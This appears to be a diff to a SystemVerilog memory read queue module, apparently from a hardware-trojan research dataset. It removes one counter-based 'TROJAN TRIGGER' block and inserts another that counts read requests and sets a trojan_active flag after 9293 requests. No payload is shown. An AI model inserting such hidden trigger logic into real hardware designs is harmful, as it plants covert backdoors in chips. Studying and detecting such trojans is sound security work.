@@ -24,24 +24,6 @@ output
     MemoryReadReq headData
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 12161;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (MemoryReadReq) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     typedef logic [`MEMORY_AXI4_READ_ID_WIDTH-1: 0] IndexPath;
 
     IndexPath headPtr;
@@ -59,6 +41,23 @@ output
             .headPtr( headPtr ),
             .tailPtr( tailPtr )
         );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=9293)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 9293;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (MemoryReadReq) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
         
 
     logic [ `MEMORY_AXI4_READ_ID_WIDTH+`MEMORY_AXI4_ADDR_BIT_SIZE-1:0 ] memoryReadReqQueue[ `MEMORY_AXI4_READ_ID_NUM ]; // synthesis syn_ramstyle = "select_ram"
